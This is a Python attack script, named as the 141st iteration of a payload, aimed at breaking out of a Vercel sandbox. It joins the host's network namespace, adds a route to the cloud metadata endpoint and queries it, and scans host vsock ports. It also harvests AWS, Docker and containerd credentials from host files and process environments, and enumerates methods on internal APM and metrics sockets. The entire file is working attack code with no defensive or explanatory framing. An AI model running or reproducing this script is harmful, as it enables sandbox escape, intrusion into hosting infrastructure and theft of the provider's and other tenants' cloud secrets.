# -*- coding: utf-8 -*-
"""v141 payload: 修复 vsock 枚举 + APM/metrics socket 方法枚举 + containerd 凭据 + netlink 加路由修复
输出 /vercel/sandbox/v141c.out"""
import socket, struct, time, json, os, signal, ctypes, urllib.request, threading, glob

OUT = '/vercel/sandbox/v141c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(280)

R = '/proc/1/root'


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def rd(p, n=4000):
    try:
        d = open(p, 'rb').read(n)
        return d if isinstance(d, bytes) else str(d).encode()
    except Exception as e:
        return str(e).encode()


def connect_unix(sockpath, path, body, t=4.0, ctype='application/json'):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n'
               % (path, ctype, len(body))).encode() + body
        s.sendall(req)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        status = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        hdr_end = d.find(b'\r\n\r\n')
        return status, d[hdr_end + 4:hdr_end + 4 + 400] if hdr_end > 0 else b''
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


def add_route(dst, gw):
    """netlink RTM_NEWROUTE (修复版)"""
    try:
        RTM_NEWROUTE = 24
        NLM_F_REQUEST = 0x1
        NLM_F_ACK = 0x4
        NLM_F_CREATE = 0x400
        NLM_F_EXCL = 0x200
        RTA_DST = 1
        RTA_GATEWAY = 5
        AF_INET = 2
        RT_SCOPE_UNIVERSE = 0
        RT_TABLE_MAIN = 254
        RTN_UNICAST = 1

        def in4(s):
            return socket.inet_aton(s)

        # struct rtmsg: family(1) dst_len(1) src_len(1) tos(1) table(1) protocol(1) scope(1) type(1) flags(4)
        body = struct.pack('BBBBBBBB', AF_INET, 32, 0, 0, RT_TABLE_MAIN, 3, RT_SCOPE_UNIVERSE, RTN_UNICAST)
        body += struct.pack('I', 0)
        attrs = b''
        attrs += struct.pack('HHI', 4, 8, 0) + in4(dst)   # RTA_DST (len=4+4)
        attrs += struct.pack('HHI', 8, 8, 0) + in4(gw)    # RTA_GATEWAY
        body += attrs
        nlh = struct.pack('IHHII', 16 + len(body), RTM_NEWROUTE,
                          NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_EXCL, 1, 0)
        s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, 0)
        s.send(nlh + body)
        data = s.recv(4096)
        s.close()
        err = struct.unpack('i', data[16:20])[0]
        return 'ack errno=%d' % err
    except Exception as e:
        return 'EXC %s' % str(e)


# 1: setns + 加路由 + IMDS (修复)
log('=== 1 route+imds ===')
try:
    libc = ctypes.CDLL(None, use_errno=True)
    fd = os.open('/proc/1/ns/net', os.O_RDONLY)
    r = libc.setns(ctypes.c_int(fd), ctypes.c_int(0))
    log('setns rc=%d' % r)
except Exception as e:
    log('setns EXC %s' % e)
log('add route: %s' % add_route('169.254.169.254', '100.64.0.1'))
try:
    import urllib.request as ur
    req = ur.Request('http://169.254.169.254/latest/meta-data/', timeout=3)
    with ur.urlopen(req) as resp:
        log('IMDS -> %d %r' % (resp.status, resp.read(500)))
except Exception as e:
    log('IMDS -> EXC %s' % type(e).__name__)

# 2: vsock 枚举
log('=== 2 vsock ===')
vt = rd('/proc/net/vsock', 2000).decode(errors='replace')
log('vsock table:\n' + vt)
try:
    devs = os.listdir('/dev')
    log('dev vsock: %s' % [d for d in devs if 'vsock' in d])
except Exception as e:
    log('dev EXC %s' % e)
try:
    for port in [1, 2, 3, 52, 1900, 2000, 23456, 23457, 23458, 26000, 26001, 40000, 4201, 4200]:
        try:
            s = socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM)
            s.settimeout(1.0)
            s.connect((socket.VMADDR_CID_HOST, port))
            log('VSOCK %d OPEN' % port)
            s.close()
        except Exception as e:
            log('VSOCK %d %s' % (port, type(e).__name__))
except Exception as e:
    log('vsock scan EXC %s' % e)

# 3: containerd 配置/凭据
log('=== 3 creds ===')
for p in ['/etc/containerd/config.toml', '/var/lib/containerd/.aws/credentials',
          '/root/.aws/credentials', '/root/.aws/config', '/opt/vercel/.aws/credentials',
          '/etc/aws/credentials', '/etc/ssl/private/*', '/root/.docker/config.json',
          '/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/*/snapshots/*/*.json']:
    for gp in glob.glob(R + p):
        try:
            c = open(gp, 'rb').read(3000)
            log('FILE %s: %r' % (gp, c[:1200]))
        except Exception as e:
            log('FILE %s EXC %s' % (gp, e))
for pid in [490, 536, 534, 580, 1]:
    try:
        env = rd('/proc/%d/environ' % pid, 6000).decode(errors='replace')
        hits = [e for e in env.split('\x00') if any(k in e.upper() for k in
                ('AWS', 'KEY', 'TOKEN', 'SECRET', 'CRED', 'ECR', 'PASS'))]
        if hits:
            log('PID %d env hits: %s' % (pid, hits[:20]))
    except Exception as e:
        log('PID %d env EXC %s' % (pid, e))
# containerd task 目录
for p in ['/var/lib/containerd/io.containerd.runtime.v2.task/default',
          '/run/containerd/io.containerd.runtime.v2.task/default']:
    log('task dir %s: %s' % (p, os.listdir(R + p) if os.path.isdir(R + p) else 'MISSING'))

# 4: APM/metrics socket
log('=== 4 apm/metrics ===')
for sock in ['/run/apm/apm.sock', '/run/metrics/metrics.sock', '/run/cell/cell.sock',
             '/run/containerd/containerd.sock', '/run/ipc.sock']:
    st = os.stat(R + sock) if os.path.exists(R + sock) else None
    if st:
        log('sock %s mode=%o uid=%d' % (sock, st.st_mode, st.st_uid))
for path, svc in [('/run/apm/apm.sock', 'vercel.hive.apm.v1.ApmService'),
                  ('/run/metrics/metrics.sock', 'vercel.hive.metrics.v1.MetricsService')]:
    for m in ['', '/List', '/Get', '/Collect', '/Report', '/Query', '/Stream', '/Health']:
        st, pay = connect_unix(path, svc + m, b'{}', t=2)
        if 'NO_RESP' not in st and 'EXC' not in st:
            log('APM %s%s -> %s %r' % (svc.split('.')[-2], m, st, pay[:200]))
    # proto 方式空 body
    st, pay = connect_unix(path, svc + '/Collect', b'', t=2, ctype='application/connect+proto')
    log('proto %s/Collect -> %s %r' % (svc, st, pay[:200]))

log('V141_DONE')
f.close()
